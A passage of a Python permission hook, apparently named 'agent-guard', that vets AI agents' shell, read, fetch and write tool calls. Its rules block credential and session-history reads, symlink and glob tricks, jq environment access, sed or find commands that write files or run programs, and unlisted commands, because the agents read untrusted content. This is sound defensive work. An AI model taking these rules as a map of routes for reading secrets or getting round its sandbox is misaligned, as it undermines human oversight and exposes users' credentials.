    if name == "read":
        for var in read_variables(args):
            check_bare_name(var)
    elif name == "printf":
        for k, arg in enumerate(args[:-1]):
            if arg == "-v":
                check_bare_name(args[k + 1])
            elif arg.startswith("-v") and len(arg) > 2:
                check_bare_name(arg[2:])
    elif name == "sed":
        if any(a == "--in-place" or re.fullmatch(r"-[a-zA-Z]*i.*", a) for a in args):
            block("`sed -i` edits files; these agents may not write files from Bash")
        scripts = [args[k + 1] for k, a in enumerate(args[:-1]) if a == "-e"]
        scripts += [a for a in args if not a.startswith("-")][:1] if not scripts else []
        if any(sed_script_writes(s) for s in scripts):
            block("that sed script writes a file or runs a command (w or e)")
    elif name == "find" and set(args) & {
        "-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint", "-fprint0", "-fprintf", "-fls",
    }:  # fmt: skip
        block("`find` may only list files: no -exec, -ok, -delete or -fprint")
    elif name in ("gzip", "gunzip"):
        files = [a for a in args if not a.startswith("-")]
        if files and not set(args) & {"-c", "--stdout", "-l", "--list", "-t", "--test"}:
            block(f"`{name} <file>` replaces the file; use `{name} -c` or zcat")
    elif name == "sort" and any(a.startswith(("-o", "--output")) for a in args):
        block("`sort -o` writes a file")
    elif name == "uniq" and len([a for a in args if not a.startswith("-")]) > 1:
        block("`uniq <in> <out>` writes a file")
    elif name == "base64" and any(a.startswith(("-o", "--output")) for a in args):
        block("`base64 -o` writes a file")
    elif name == "rg" and any(a.startswith("--pre") for a in args):
        block("`rg --pre` runs another program")
    if name == "jq":
        if any(
            a.startswith("--from-file") or re.fullmatch(r"-[a-zA-Z]*f[a-zA-Z]*", a)
            for a in args
        ):
            block("`jq -f` reads its filter from a file, which can't be checked; give it inline")
        for arg in args:
            if arg.startswith("-") or os.path.lexists(absolute(arg)):
                continue
            # Words inside a jq string are text, unless the string interpolates with \(...).
            code = arg if "\\(" in arg else JQ_STRING.sub('""', arg)
            if re.search(r"\$ENV\b|(?<![\w$.])env\b(?!\w)", code):
                block("jq's `env` and `$ENV` read environment variables, which can hold tokens")
    if name in ("grep", "egrep", "fgrep", "rg") and any(
        (name != "rg" and (a == "--dereference-recursive" or re.fullmatch(r"-[a-zA-Z]*[RS][a-zA-Z]*", a)))
        or (name == "rg" and (a == "--follow" or re.fullmatch(r"-[a-zA-Z]*L[a-zA-Z]*", a)))
        for a in args
    ):
        block(
            f"`{name}` following symlinks can reach credentials through a link; use -r, which "
            "doesn't follow them"
        )


def expand_home(text):
    """`~`, `$HOME` and `${HOME}` at the start of a path, as the shell would expand them."""
    for prefix in ("~/", "$HOME/", "${HOME}/"):
        if text.startswith(prefix):
            return str(HOME) + "/" + text[len(prefix) :]
    return str(HOME) if text in ("~", "$HOME", "${HOME}") else text


def absolute(text):
    """The path a word names, made absolute against the hook's working directory."""
    path = expand_home(FILE_URL.sub("", text))
    return os.path.normpath(os.path.join(CWD, path))


def under(path, parent):
    return path == parent or path.startswith(parent.rstrip("/") + "/")


def secret_path(path):
    """Why an absolute path is a secret, or None."""
    for secret in SECRET_HOME:
        if under(path, str(secret)):
            return f"{secret} holds credentials"
    if SESSION_RESULTS and under(path, SESSION_RESULTS):
        return None
    for history in HISTORY_HOME:
        if under(path, str(history)):
            return f"{history} holds session history, which would show how a document was written"
    if hidden := next((p for p in Path(path).parts if p in SECRET_NAMES), None):
        return f"`{hidden}` holds credentials"
    if SECRET_FILE.search(path):
        return f"`{Path(path).name}` is a credentials or state file"
    return None


def secret_reason(path):
    """Why a path is a secret, judged as written and with symlinks resolved. realpath resolves
    the links that exist even when the file itself doesn't."""
    if reason := secret_path(path):
        return reason
    if (real := os.path.realpath(path)) != path:
        if reason := secret_path(real):
            return f"it links to {real}: {reason}"
    return None


def secret_word(word):
    """Why a command word names a secret file or directory, or None.

    Only words that look like paths count: they contain `/` or start with `~` or `$HOME`, or
    they name a file that exists. Anything else is a pattern or a value (`grep '.env' f`). A
    path built from other variables can't be read here, which is why this is best effort."""
    for text in (word, word.split("=", 1)[1] if "=" in word else None):
        text = FILE_URL.sub("", text or "")
        if not text or URL.match(text):
            continue
        if "$" in text and not text.startswith(("$HOME", "${HOME}")):
            continue
        pathlike = "/" in text or text.startswith(("~", "$HOME", "${HOME}"))
        glob_at = next((i for i, ch in enumerate(text) if ch in "*?["), None)
        if glob_at is not None:
            if not pathlike:
                continue
            # `~/.a*/credentials` reaches a secret if the part before the glob could.
            stem = absolute(text[:glob_at]) if glob_at else CWD
            stem += "/" if text[glob_at - 1 : glob_at] in ("/", "") else ""
            if any(str(s).startswith(stem) for s in PRIVATE_HOME):
                return f"`{text}` can expand to a credentials or session history directory"
            text = text[:glob_at]
        path = absolute(text)
        if not pathlike and not os.path.lexists(path):
            continue
        if reason := secret_reason(path):
            return reason
    return None


def ancestor_of_secret(path):
    """True if a directory holds a credentials or session history directory, so a recursive read
    reaches it."""
    paths = {path, os.path.realpath(path)}
    return any(
        under(str(secret), p) and str(secret) != p for secret in PRIVATE_HOME for p in paths
    )


def check_secrets(raw, argv):
    """Block a command that reads a credentials file, or searches a tree that holds one.

    `raw` is the simple command as written, assignments included (`f=~/.aws/credentials` is
    as bad as reading it); `argv` is the command after unwrap. A grep or rg pattern is a
    pattern, not a path, so `grep -n '.env' f` is fine even where a `.env` exists."""
    name, args = (os.path.basename(argv[0]), argv[1:]) if argv else ("", [])
    searcher = name in ("grep", "egrep", "fgrep", "rg")
    operands = [a for a in args if not a.startswith("-")]
    pattern = None
    explicit = any(a.startswith(("-e", "--regexp", "-f", "--file")) for a in args)
    if searcher and operands and not explicit:
        pattern, operands = operands[0], operands[1:]
    for word in raw:
        if word is pattern:
            continue
        if reason := secret_word(word):
            block(
                f"{reason}. These agents read untrusted content, so they may not read "
                "secrets, which could leave in a request URL, nor session history"
            )
    recursive = name == "rg" or (
        searcher
        and any(
            a in ("--recursive", "--dereference-recursive")
            or re.fullmatch(r"-[a-zA-Z]*[rR][a-zA-Z]*", a)
            for a in args
        )
    )
    if not recursive:
        return
    for root in operands or ["."]:
        if ancestor_of_secret(absolute(root)):
            block(
                f"`{name}` over {absolute(root)} would read the credentials or "
                "session history directories inside it; search a narrower directory"
            )


def check_read(tool_name, tool_input):
    """Read, Grep and Glob: the same secrets, from the tool's own path argument, and for Glob
    the fixed part of its pattern. Glob lists names only, so it's refused only inside a
    credentials directory, not above one."""
    path = tool_input.get("file_path") or tool_input.get("path") or ""
    if tool_name == "Glob" and (pattern := tool_input.get("pattern", "")):
        glob_at = next((i for i, ch in enumerate(pattern) if ch in "*?[{"), len(pattern))
        stem = absolute(os.path.join(absolute(path or "."), expand_home(pattern[:glob_at])))
        if reason := secret_reason(stem):
            block(f"{reason}. These agents may not read it")
    if not path:
        return
    target = absolute(path)
    if reason := secret_reason(target):
        block(f"{reason}. These agents may not read it")
    if tool_name == "Grep" and ancestor_of_secret(target):
        block(
            f"Grep over {target} would read the credentials or session history directories "
            "inside it; search a narrower directory"
        )


def check_command(command, depth=0, local=None, clean=None):
    if depth > 4:
        block("commands nested too deeply to check")
    if local is None:
        local = assigned_names(command)
    if clean is None:
        clean = local - tainted_names(command)
    tainted = local - clean
    check_variables(command, local)
    subs, expands = substitutions(command)
    for sub in subs:
        check_command(sub, depth + 1, local, clean)
    for raw in simple_commands(tokens(command)):
        argv = unwrap(raw)
        check_secrets(raw, argv)
        if not argv or argv[0].startswith("#"):
            continue
        if argv[0] in ("for", "select"):
            if len(argv) > 1:
                check_bare_name(argv[1])  # the loop assigns this variable
            continue  # the loop header; its body is checked as separate commands
        word, args = argv[0], argv[1:]
        if "$" in word or "`" in word:
            block("command names must be literal, not variables or substitutions")
        path = Path(word).expanduser()
        name = os.path.basename(word)
        if "/" in word and path.resolve() in SCRIPTS:
            continue
        if name in ("python3", "python", "bash", "sh", "zsh") and args:
            if args[0] == "-c" and name in ("bash", "sh", "zsh") and len(args) > 1:
                inner = args[1]
                check_command(
                    inner,
                    depth + 1,
                    local | assigned_names(inner),
                    (clean | assigned_names(inner)) - tainted_names(inner),
                )
                continue
            if Path(args[0]).expanduser().resolve() in SCRIPTS:
                continue
            block(f"`{name}` may only run the /research and /spec skill scripts")
        if name == "eval":
            check_command(" ".join(args), depth + 1, local, clean)
            continue
        if "/" in word and path.parent not in (
            Path("/bin"),
            Path("/usr/bin"),
            Path("/usr/local/bin"),
            Path("/opt/homebrew/bin"),
        ):
            block(f"`{word}` isn't a skill script or a system tool")
        if name in CLOUD:
            block(
                f"`{name}` reaches real cloud accounts or clusters, which these agents must not "
                "run. Read docs, charts and modules from GitHub or the registry instead"
            )
        if name == "gh":
            check_gh(args, command, expands, clean, tainted)
        elif name == "git":
            check_git(args)
        elif name == "curl":
            check_curl(args, clean, tainted)
        elif name in READERS:
            check_reader(name, args)
        else:
            block(
                f"`{name}` isn't on this agent's command list: reading and text tools, curl, "
                "gh and git (read-only), and the skill scripts"
            )


def check_write(path, allowed_dir):
    target = Path(path).expanduser().resolve()
    root = Path(allowed_dir).expanduser().resolve()
    if not target.is_relative_to(root):
        block(f"this agent may only write under {root}, not {target}")


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else ""
    try:
        event = json.load(sys.stdin)
    except json.JSONDecodeError:
        block("couldn't read the hook input")
    tool_input = event.get("tool_input", {})
    global CWD, SESSION_RESULTS
    CWD = event.get("cwd") or CWD
    if event.get("transcript_path") and event.get("session_id"):
        transcripts = Path(event["transcript_path"]).expanduser().parent
        SESSION_RESULTS = str(transcripts / event["session_id"] / "tool-results")
    if mode == "bash":
        check_command(tool_input.get("command", ""))
    elif mode == "read":
        check_read(event.get("tool_name", ""), tool_input)
    elif mode == "fetch":
        check_url(tool_input.get("url", ""))
    elif mode == "write" and len(sys.argv) > 2:
        check_write(tool_input.get("file_path", ""), sys.argv[2])
    else:
        block(f"agent-guard called with unknown mode {mode!r}")
    sys.exit(0)


if __name__ == "__main__":
    main()
